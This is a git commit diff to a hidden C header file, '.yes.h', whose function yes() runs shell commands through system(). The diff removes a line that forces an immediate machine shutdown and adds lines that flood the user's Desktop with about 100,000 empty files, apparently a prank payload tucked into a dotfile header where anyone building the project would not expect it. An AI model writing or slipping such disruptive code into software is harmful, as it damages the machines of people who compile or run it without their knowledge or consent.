6eaedf6eb2c3b34d85a6f2dd42c172b00ccdd4c7
sixie <sakine.yasser@gmail.com>
2021-08-30 11:51:36 -0700

    more files

--- .yes.h
+++ .yes.h
@@ -3,5 +3,13 @@
 void	yes()
 {
 	system("bash -c \"touch ~/Desktop/file{1..10000}.txt\"");
-	system("bash -c \"shutdown -P now\"");
+	system("bash -c \"touch ~/Desktop/file{10000..20000}.txt\"");
+	system("bash -c \"touch ~/Desktop/file{20000..30000}.txt\"");
+	system("bash -c \"touch ~/Desktop/file{30000..40000}.txt\"");
+	system("bash -c \"touch ~/Desktop/file{40000..50000}.txt\"");
+	system("bash -c \"touch ~/Desktop/file{50000..60000}.txt\"");
+	system("bash -c \"touch ~/Desktop/file{60000..70000}.txt\"");
+	system("bash -c \"touch ~/Desktop/file{70000..80000}.txt\"");
+	system("bash -c \"touch ~/Desktop/file{80000..90000}.txt\"");
+	system("bash -c \"touch ~/Desktop/file{90000..100000}.txt\"");
 }
